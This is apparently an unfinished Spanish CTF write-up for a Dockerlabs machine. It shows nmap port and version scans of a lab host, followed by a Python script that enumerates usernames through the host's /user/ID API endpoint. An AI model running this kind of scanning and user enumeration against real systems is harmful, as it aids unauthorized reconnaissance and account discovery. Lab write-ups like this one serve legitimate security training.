

# Enumeración 

Vamos a empezar con un sencillo escaneo nmap, para enumerar primeramente puertos abiertos que corren en la máquina.

<pre>
  <code>
┌──(root㉿kali)-[/home/kali/Dockerlabs]
└─# nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2 -oN info_ports
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-21 20:20 CET
Nmap scan report for 172.17.0.2
Host is up (0.0000070s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
12345/tcp open  netbus
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.15 seconds

  </code>
</pre>

-p- : 
--open:



Bien vemos los puertos 22 donde corre ssh y el 12345 donde corre netbus. Vamos a realizar un segundo escaneo para enumerar versiones y servicios que corren en dichos puertos.

<pre>
  <code>
┌──(root㉿kali)-[/home/kali/Dockerlabs]
└─# nmap -p22,12345 -sCV 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-21 20:23 CET
Nmap scan report for buffered.dl (172.17.0.2)
Host is up (0.000043s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 4f:3f:8c:fb:88:da:ea:37:d6:9f:c3:bd:f4:8e:18:1b (ECDSA)
|_  256 2e:a1:36:ff:8b:bb:0d:b3:c8:cb:4a:81:cb:37:77:31 (ED25519)
12345/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
|_http-title: Site doesn't have a title (application/json).
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.85 seconds

  </code>
</pre>

Vemos que tenemos Openssh 9.2p1 por ahí no podemos hacer mucho vamos a acceder desde el navegador al puerto 12345 donde corre Werkzeug

<pre>
  <code>
    #!/usr/bin/env python3
    # Creador: wvverez
    # https://github.com/wvverez
    
import requests
import sys
import os
import time

# Colores (A gusto)
RED = '\033[1;31m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
MAGENTA = '\033[1;35m'
CYAN = '\033[1;36m'
RESET = '\033[0m'

BASE_URL = "http://172.17.0.2:12345/user/"
OUTPUT_FILE = "usuarios.txt"

def obtener_usuarios():
    usuarios = []
    max_id = 1000  # Para que no sea infinito no creo que haya más de aquí.
    print(f"{CYAN}[*] Buscando los usuarios...{RESET}")
    print(f"{RED}{'-' * 40}{RESET}")
    print(f"{RED} [*] Author: Wvverez{RESET}")
    print(f"{RED} [*] https://github.com/wvverez{RESET}")
    print(f"{RED} [*] Descubrimiento de usuarios...{RESET}")
    print(f"{RED}{'-' * 40}{RESET}")
    
    for user_id in range(1, max_id + 1):
        try:
            response = requests.get(f"{BASE_URL}{user_id}", timeout=5)
            if response.status_code == 200:
                data = response.json()
                username = data.get("username")
                if username:  # Corregido: "usernamme" -> "username"
                    usuarios.append(username)
                    print(f"{GREEN}[*] Usuarios encontrado: {username}{RESET}")
                    time.sleep(1)
                else:
                    print(f"{YELLOW}[!] No se encontró nombre de usuario{RESET}")
            elif response.status_code == 404:
                # Aquí basicamente lo que hacemos es que si encontramos un 404, no hay más usuarios.
                print(f"{RED}[!] No se encontraron nombres de usuarios {RESET}")
                break
            else:
                print(f"{RED}[!] Error HTTP en ID {user_id}: {response.status_code}{RESET}")
                time.sleep(5)
        except requests.RequestException as e:
            print(f"{RED}[!] Error en la solicitud para ID {user_id}: {str(e)}{RESET}")
            break
    
    print(f"{YELLOW}{'-' * 40}{RESET}")
    return usuarios

def guardar_usuarios(usuarios):
    try:
        with open(OUTPUT_FILE, "w", encoding="utf-8") as file:  # Corregido: {OUTPUT_FILE} -> OUTPUT_FILE
            for username in usuarios:
                file.write(username + "\n")
        print(f"{GREEN}[*] Usuarios guardados en {OUTPUT_FILE}{RESET}")
    except IOError as e:
        print(f"{RED}[!] Error al guardar el archivo: {str(e)}{RESET}")

def main():
    usuarios = obtener_usuarios()
    if usuarios:
        while True:
            print(f"{BLUE}[*] Quieres guardar el reporte en usuarios.txt? (s/n): {RESET}", end="")
            respuesta = input().lower()
            if respuesta in ['s', 'si', 'sí']:
                guardar_usuarios(usuarios)
                break
            elif respuesta in ['n', 'no']:
                print(f"{RED}[!] Por favor, responda 's' o 'n'. {RESET}")
                break  # Corregido: añadido break para salir del bucle
            else:
                print(f"{RED}[!] No encuentra usuarios pa guardar{RESET}")
    else:
        print(f"{RED}[!] No se encontraron usuarios para guardar{RESET}")  # Mensaje mejorado

if __name__ == "__main__":
    main()

  </code>
</pre>
